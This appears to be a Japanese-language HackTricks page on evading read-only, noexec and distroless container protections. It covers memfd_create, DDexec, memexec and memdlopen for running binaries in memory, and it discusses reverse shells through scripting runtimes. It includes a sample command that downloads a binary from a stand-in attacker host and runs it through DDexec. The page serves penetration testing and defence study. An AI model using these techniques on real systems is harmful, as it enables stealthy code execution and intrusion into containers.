# Bypass FS protections: read-only / no-exec / Distroless

## Videos

以下の動画では、このページで言及している techniques について、より詳しく解説しています:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec シナリオ

container では、security context で **`readOnlyRootFilesystem: true`** を設定すると、root filesystem を read-only として mount できます。<sup>[[3]](#references)</sup> 例:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

read-only root にしても、別途 mount された volumes が read-only になるわけではありません。Docker は **`/dev/shm`** を IPC mount として扱いますが、`rw` や `noexec` などの tmpfs options は runtime configuration の選択です。いずれかの挙動を前提にする前に、対象 container の mount options を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> red-team の観点では、この組み合わせにより、まだ利用可能になっていない binaries（backdoors や enumeration tools など）を download して execute することが難しくなる場合があります。<sup>[[4]](#references)[[5]](#references)</sup>

## 最も簡単な bypass: Scripts

`noexec` mount は、その mount 上にある binaries の直接 execution をブロックしますが、interpreter は引き続き script を読み取り、interpret できます。したがって、`sh` や `python` が存在する場合は、その interpreter を通じて shell または Python script を実行できます。<sup>[[5]](#references)</sup>

必要な tool 自体が binary である場合には、これは役に立ちません。<sup>[[5]](#references)</sup>

## Memory Bypasses

mounted path からの直接 execution がブロックされている場合、ELF を memory に load し、in-memory path を通じて execute する方法があります。これにより、その mount に対する `noexec` check は回避できますが、その他の kernel、permission、policy による controls がなくなるわけではありません。<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

scripting runtime が該当する Linux interface にアクセスできる場合、**`memfd_create(2)`** を使用して anonymous かつ RAM-backed な file descriptor を作成し、そこに ELF bytes を書き込んだうえで、fd-backed execution path を使用できます。[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project は、この workflow 用の compressed かつ base64-encoded な Python、Perl、Ruby code を生成します。<sup>[[6]](#references)[[7]](#references)</sup>

この project が現在 document している targets は Python、Perl、Ruby です。PHP や Node には別の runtime-specific technique または extension が必要となるため、ある language 用のこの generator が存在しないことは、in-memory execution が不可能であることを意味しません。<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> **`/dev/shm`** に書き込まれた通常の executable は、その mount の **`noexec`** setting の対象となります。通常の file descriptor を通じて開くだけでは、mount policy は変わりません。<sup>[[5]](#references)</sup>
>
> 正確な memory-execution method は、runtime、architecture、kernel、利用可能な permissions にも依存します。<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、**`/proc/self/mem`** を通じて stager と loader を実行中の shell process に書き込み、その後 control をその code に移します。<sup>[[8]](#references)</sup>

これにより、process は supplied binary を、まずその binary を executable filesystem 上に配置することなく load できます。<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** は、**memory** から shellcode または binary を load して **execute** できます。<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
詳細については、Githubまたは以下を確認してください：

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)は、daemon化されたDDexecの実装です。そのdaemonは、引数とraw program bytesを含むリクエストを待ち受け、各プログラムをloadして実行するためにchildをforkし、parentをserverとして維持します。<sup>[[9]](#references)</sup>

repositoryには、[a.php](https://github.com/arget13/memexec/blob/main/a.php)に**PHP reverse shellからmemexecを使用してbinariesを実行する**例が含まれています。<sup>[[9]](#references)</sup>

### Memdlopen

DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memdlopen)は、shared objectまたはprogram向けのfileless `dlopen()`実装です。現在のREADMEではARM64 supportについて記載されているため、使用前にtarget architectureを確認してください。<sup>[[10]](#references)</sup>

## Distroless Bypass

**distrolessが実際には何なのか**、いつ役立つのか、いつ役立たないのか、そしてcontainersにおけるpost-exploitation tradecraftをどのように変えるのかについて詳しくは、以下を確認してください：

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### distrolessとは

Distroless imagesにはapplicationとそのruntime dependenciesのみが含まれます。official imagesでは、package managers、shells、その他の標準Linux distributionで想定されるprogramsが省かれています。<sup>[[11]](#references)</sup>

runtime imageをこれらのdependenciesに限定することで、productionに存在するsoftwareと、scanおよびtrackが必要な対象の量を削減できます。<sup>[[11]](#references)</sup>

### Reverse Shell

distroless containerでは、通常のshell用の**`sh`または`bash`が見つからない**場合があり、`ls`、`whoami`、`id`などのcommon utilitiesも存在しないことがあります。<sup>[[11]](#references)</sup>

> [!WARNING]
> したがって、通常のshell-based reverse shellやutility-based enumerationは機能しない可能性があります。<sup>[[11]](#references)</sup>

compromised applicationにlanguage runtime（たとえば、Flask application向けのPythonやNode application向けのNode.js）が含まれている場合、RCEによって、そのruntimeをcommand channelやAPI経由のsystem inspectionに使用できる可能性があります。<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> 使用可能なscripting languageを使い、そのlanguage capabilitiesを通じて**systemをenumerate**してください。<sup>[[12]](#references)</sup>

**read-only/no-exec** protectionsが存在しない場合、command channelによってbinariesをwritableかつexecutableなmountに書き込み、実行できる可能性があります。まずmount optionsとpermissionsを確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> これらのprotectionsが存在する場合は、runtime、kernel、permissionsが許す範囲で、上記の**memory-execution techniques**を使用してください。<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE vulnerabilitiesをexploitしてscripting-language **reverse shells**を取得し、memoryからbinariesを実行する**examples**は、[**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)で確認できます。<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - ステルスと回避のためのLinux Memory Manipulationの探究](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ngとin-memory dlopen()によるStealth intrusions - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [PodまたはContainerのSecurity Contextを設定する](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
